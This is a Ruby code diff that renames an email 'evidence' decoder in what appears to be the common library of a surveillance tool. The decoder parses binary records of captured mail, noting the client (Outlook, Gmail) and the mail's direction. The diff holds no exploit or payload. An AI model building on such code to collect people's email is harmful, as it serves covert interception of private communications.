@@ -4,10 +4,10 @@ require 'rcs-common/evidence/common'
 require 'mail'
 
 module RCS
-module MailrawEvidence
+module MailEvidence
 
-  MAILRAW_VERSION = 2009070301
-  MAILRAW_2_VERSION = 2012030601
+  MAIL_VERSION = 2009070301
+  MAIL_2_VERSION = 2012030601
 
   MAIL_INCOMING = 0x00000010
 
@@ -31,7 +31,7 @@ module MailrawEvidence
     
     ft_high, ft_low = Time.now.to_filetime
     body = email.to_s
-    add_header = [MAILRAW_VERSION, 1, body.bytesize, ft_high, ft_low].pack("I*")
+    add_header = [MAIL_VERSION, 1, body.bytesize, ft_high, ft_low].pack("I*")
     binary.write(add_header)
     binary.write(body)
 
@@ -43,7 +43,7 @@ module MailrawEvidence
   end
   
   def decode_additional_header(data)
-    raise EvidenceDeserializeError.new("incomplete MAILRAW") if data.nil? or data.bytesize == 0
+    raise EvidenceDeserializeError.new("incomplete MAIL") if data.nil? or data.bytesize == 0
 
     ret = Hash.new
     ret[:data] = Hash.new
@@ -54,10 +54,13 @@ module MailrawEvidence
     version, flags, size, ft_low, ft_high = binary.read(20).unpack('L*')
     
     case version
-      when MAILRAW_VERSION
+      when MAIL_VERSION
         ret[:data][:program] = 'outlook'
-      when MAILRAW_2_VERSION
-        program = binary.read(4).unpack('L*')
+      when MAIL_2_VERSION
+        program = binary.read(4).unpack('L')
+
+        trace :debug, "MAIL: program #{program} flags #{flags}"
+
         case program
           when PROGRAM_GMAIL
             ret[:data][:program] = 'gmail'
@@ -71,7 +74,7 @@ module MailrawEvidence
         # direction of the mail
         ret[:data][:incoming] = (flags & MAIL_INCOMING != 0) ? 1 : 0
       else
-        raise EvidenceDeserializeError.new("invalid log version for MAILRAW")
+        raise EvidenceDeserializeError.new("invalid log version for MAIL")
     end
 
 
@@ -133,5 +136,6 @@ module MailrawEvidence
     yield info if block_given?
     :delete_raw
   end
-end # ::Mailraw
+end # ::Mail
+
 end # ::RCS
